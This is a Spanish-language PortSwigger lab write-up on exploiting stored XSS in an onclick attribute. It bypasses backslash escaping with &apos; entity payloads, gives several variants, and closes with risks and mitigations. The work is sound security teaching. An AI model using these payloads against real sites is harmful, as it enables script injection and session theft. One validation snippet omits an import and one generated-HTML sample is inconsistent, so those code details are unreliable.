
---

# Stored XSS en evento `onclick` con HTML-encoding y escapes múltiples

En este documento explicamos cómo explotar una vulnerabilidad de Cross-Site Scripting almacenado cuando la entrada del usuario se inserta dentro de un manejador de evento `onclick` y el servidor aplica múltiples capas de codificación y escapes: HTML-encoding de ángulos (`<`, `>`) y comillas dobles (`"`), y escaping con backslash de comillas simples (`'`) y el propio backslash (`\`).

[Ver laboratorio PortSwigger](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped)

---

## Contexto del laboratorio

- **Objetivo**: encontrar y explotar una vulnerabilidad de XSS almacenado en la funcionalidad de comentarios.
    
- **Requisito para resolver el laboratorio**: enviar un comentario de manera que, al hacer clic en el nombre del autor del comentario, se ejecute `alert(0)`.
    
- **Peculiaridad observada**: el servidor aplica las siguientes protecciones sobre la entrada del usuario antes de insertarla en el atributo `onclick`:
    
    1. **HTML-encoding de ángulos**: `<` → `&lt;`, `>` → `&gt;`
    2. **HTML-encoding de comillas dobles**: `"` → `&quot;`
    3. **Escape con backslash**: `'` → `\'` y `\` → `\\`

Estas defensas intentan prevenir la inyección de nuevas etiquetas HTML y el cierre prematuro de cadenas JavaScript, pero son insuficientes en contextos de atributos de eventos.

---

## Código vulnerable observado

Cuando enviamos un comentario con nombre de autor `test`, el HTML resultante es aproximadamente:

```html
<a id="author" href="#" onclick="var tracker={track(){}};tracker.track('https://test.com');">test</a>
```

El servidor inserta el valor del campo "Website" (o similar) directamente dentro de una llamada a función en el `onclick`, rodeándolo de comillas simples. Si el usuario introduce caracteres especiales, el servidor intenta neutralizarlos con las técnicas mencionadas.

### Ejemplo sin payload malicioso

Si el campo Website contiene `https://test.com`, el `onclick` generado es:

```html
onclick="var tracker={track(){}};tracker.track('https://test.com');"
```

Al hacer clic, se ejecuta la función `tracker.track` con la URL como parámetro, sin consecuencias de seguridad.

### Intento ingenuo bloqueado

Si intentamos inyectar `' + alert(0) + '`, el servidor lo escapa:

```html
onclick="var tracker={track(){}};tracker.track('\' + alert(0) + \'');"
```

Las comillas simples quedan escapadas como `\'`, impidiendo que rompan la cadena JavaScript.

---

## Por qué las protecciones son insuficientes

Aunque el servidor escapa caracteres peligrosos con backslash, no impide el uso de **entidades HTML** dentro de atributos. El navegador realiza el **HTML decoding** de las entidades **antes** de ejecutar el código JavaScript del atributo `onclick`.

### Flujo de procesamiento del navegador

1. **Parseo HTML**: el navegador lee el atributo `onclick` y decodifica las entidades HTML (`&apos;`, `&quot;`, `&lt;`, etc.) a sus caracteres equivalentes.
2. **Ejecución de JavaScript**: el contenido decodificado se interpreta como código JavaScript.

Por tanto, si insertamos `&apos;` (entidad HTML para `'`), el navegador la decodifica a `'` **antes** de ejecutar el JavaScript, permitiéndonos romper la cadena sin que el servidor detecte comillas simples literales en la entrada.

---

## Payload que resuelve el laboratorio

```
https://test.com&apos;+alert(0)+&apos;
```

### Desglose del payload

- `https://test.com`: URL válida que no levanta sospechas iniciales.
- `&apos;`: entidad HTML que el navegador decodifica a `'` (comilla simple).
- `+alert(0)+`: concatenación JavaScript que ejecuta `alert(0)`.
- `&apos;`: cierra la cadena abierta para evitar errores de sintaxis.

### HTML generado (antes del decoding del navegador)

```html
<a id="author" href="#" onclick="var tracker={track(){}};tracker.track('https://test.com&apos;+alert(0)+&apos;');">test</a>
```

### Código JavaScript ejecutado (después del HTML decoding)

El navegador decodifica `&apos;` a `'`, resultando en:

```javascript
var tracker={track(){}};tracker.track('https://test.com'+alert(0)+'');
```

- La primera `'` cierra la cadena inicial `'https://test.com'`.
- `+alert(0)+` se ejecuta inmediatamente (concatenación fuerza evaluación).
- La última `''` crea una cadena vacía que se concatena, evitando errores de sintaxis.

Al hacer clic en el enlace, `alert(0)` se ejecuta y el laboratorio queda resuelto.

---

## Pasos para reproducir

1. Acceder al formulario de comentarios del laboratorio.
2. En el campo "Website" (o equivalente que se mapea al `onclick`), introducir:
   ```
   https://test.com&apos;+alert(0)+&apos;
   ```
3. Completar el resto de campos del comentario y enviarlo.
4. Esperar a que el servidor almacene el comentario y lo muestre en la página.
5. Inspeccionar el HTML renderizado y verificar que el `onclick` contiene las entidades `&apos;`.
6. Hacer clic en el nombre del autor del comentario.
7. Verificar que aparece la alerta `alert(0)` en el navegador.

---

## Variantes del payload

### Variante 1: Usar `&apos;` con punto y coma

```
https://test.com&apos;;alert(0);//
```

- Cierra la cadena con `&apos;` (decodifica a `'`).
- Ejecuta `alert(0);` como una instrucción separada.
- Comenta el resto del código con `//` para evitar errores.

HTML generado:

```html
onclick="var tracker={track(){}};tracker.track('https://test.com';alert(0);//');"
```

Después del decoding:

```javascript
var tracker={track(){}};tracker.track('https://test.com';alert(0);//');
```

### Variante 2: Usar múltiples entidades HTML

```
&apos;-alert(0)-&apos;
```

- Usa `-` como operador aritmético en lugar de `+`.
- Funciona igual, ejecutando `alert(0)` en el contexto de la expresión.

### Variante 3: Evitar la URL para mayor simplicidad

```
&apos;+alert(0)+&apos;
```

- Omite la URL inicial si el campo la permite.
- Más directo para pruebas de concepto.

---

## Riesgos asociados

- **Ejecución arbitraria de JavaScript**: el atacante puede ejecutar cualquier código en el contexto de la página, permitiendo robo de cookies, sesiones, acciones en nombre del usuario, keylogging, phishing, etc.
    
- **Vulnerabilidad almacenada (Stored XSS)**: el payload se guarda en el servidor y afecta a todos los usuarios que visualicen el comentario, amplificando el impacto.
    
- **Bypass de protecciones**: las defensas basadas solo en escaping de caracteres literales fallan ante el uso de entidades HTML, demostrando la importancia de un saneamiento contextual completo.

---

## Mitigaciones y soluciones

Para eliminar esta vulnerabilidad, aplicar defensas en profundidad:

### 1. **Evitar insertar datos no confiables en atributos de eventos**

Los atributos como `onclick`, `onerror`, `onload`, etc., ejecutan código JavaScript directamente. Evitar construir manejadores de eventos dinámicamente con datos del usuario.

**Solución preferida**:

- Usar **event listeners** definidos en el código JavaScript, sin inyectar valores del usuario en atributos de eventos.

```html
<a id="author" href="#" data-url="https://test.com">test</a>

<script>
document.getElementById('author').addEventListener('click', function(e) {
    e.preventDefault();
    var url = this.getAttribute('data-url');
    // usar url de forma segura
    tracker.track(url);
});
</script>
```

### 2. **Escape contextual completo para atributos JavaScript**

Si no es posible evitar la inserción, aplicar **JavaScript string escaping** adecuado:

- Escapar `\`, `'`, `"`, `\n`, `\r`, `<`, `>`, `&`, etc.
- Codificar caracteres especiales con secuencias Unicode (`\uXXXX`).

**Ejemplo (servidor)**:

```python
def js_string_escape(s):
    return s.replace('\\', '\\\\') \
            .replace("'", "\\'") \
            .replace('"', '\\"') \
            .replace('\n', '\\n') \
            .replace('\r', '\\r') \
            .replace('<', '\\x3C') \
            .replace('>', '\\x3E')
```

### 3. **Decodificar entidades HTML antes de escapar**

El servidor debe **normalizar** la entrada decodificando entidades HTML antes de aplicar el escaping, para evitar que `&apos;` evada la protección.

**Flujo seguro**:

1. Decodificar entidades HTML de la entrada del usuario.
2. Aplicar escaping contextual (JavaScript string escaping).
3. Insertar el resultado en el atributo.

### 4. **Content Security Policy (CSP)**

Implementar CSP que prohíba `unsafe-inline`:

```http
Content-Security-Policy: script-src 'self'; object-src 'none';
```

- Bloquea la ejecución de JavaScript inline en atributos de eventos.
- Requiere mover todo el JavaScript a archivos externos.

### 5. **Validación de entrada**

- Validar el formato del campo "Website" con una **expresión regular estricta** que permita solo URLs válidas con esquemas seguros (`http`, `https`).
- Rechazar entradas que contengan entidades HTML, caracteres de control, o patrones sospechosos.

**Ejemplo (servidor)**:

```python
import re
from urllib.parse import urlparse

def validate_url(url):
    # Decodificar entidades HTML
    url = html.unescape(url)
    
    # Validar esquema y formato
    parsed = urlparse(url)
    if parsed.scheme not in ['http', 'https']:
        return False
    
    # Rechazar caracteres peligrosos
    if re.search(r"['\";()<>]", url):
        return False
    
    return True
```

### 6. **Sanitización de salida**

Usar librerías de sanitización robustas que comprendan el contexto de inserción (HTML, JavaScript, CSS, URL).

**Ejemplo con bibliotecas**:

- **Python**: `bleach`, `markupsafe`
- **JavaScript**: `DOMPurify` (para sanitización en cliente)
- **Frameworks**: Angular, React, Vue sanitizan automáticamente en la mayoría de contextos; evitar usar `dangerouslySetInnerHTML` o `v-html` con datos no confiables.

---

## Ejemplo de corrección completa

### Antes (vulnerable)

```html
<a id="author" href="#" onclick="var tracker={track(){}};tracker.track('<?php echo $website; ?>');">
    <?php echo htmlspecialchars($author); ?>
</a>
```

### Después (seguro)

**HTML**:

```html
<a id="author" href="#" data-url="<?php echo htmlspecialchars($website); ?>">
    <?php echo htmlspecialchars($author); ?>
</a>
```

**JavaScript (archivo externo)**:

```javascript
document.addEventListener('DOMContentLoaded', function() {
    var authorLinks = document.querySelectorAll('a[data-url]');
    
    authorLinks.forEach(function(link) {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            var url = this.getAttribute('data-url');
            
            // Validar URL antes de usarla
            if (isValidURL(url)) {
                tracker.track(url);
            }
        });
    });
});

function isValidURL(url) {
    try {
        var parsed = new URL(url);
        return ['http:', 'https:'].includes(parsed.protocol);
    } catch {
        return false;
    }
}
```

---

## Recomendaciones finales

1. **No insertar datos no confiables en atributos de eventos**. Usar event listeners y atributos `data-*` para separar datos de código.
    
2. **Normalizar entrada** decodificando entidades HTML antes de aplicar escaping contextual.
    
3. **Aplicar escape JavaScript** riguroso si la inserción en atributos de eventos es inevitable.
    
4. **Validar formato de URLs** con whitelist de esquemas y rechazo de caracteres peligrosos.
    
5. **Implementar CSP** para bloquear JavaScript inline y reducir el impacto de XSS.
    
6. **Auditar regularmente** todas las rutas donde se insertan datos del usuario en contextos JavaScript.

---

## Referencias

- [PortSwigger Web Security Academy - XSS Contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [HTML5 Security Cheatsheet - Event Handlers](https://html5sec.org/)
- [MDN - HTML Entity References](https://developer.mozilla.org/en-US/docs/Glossary/Entity)

---
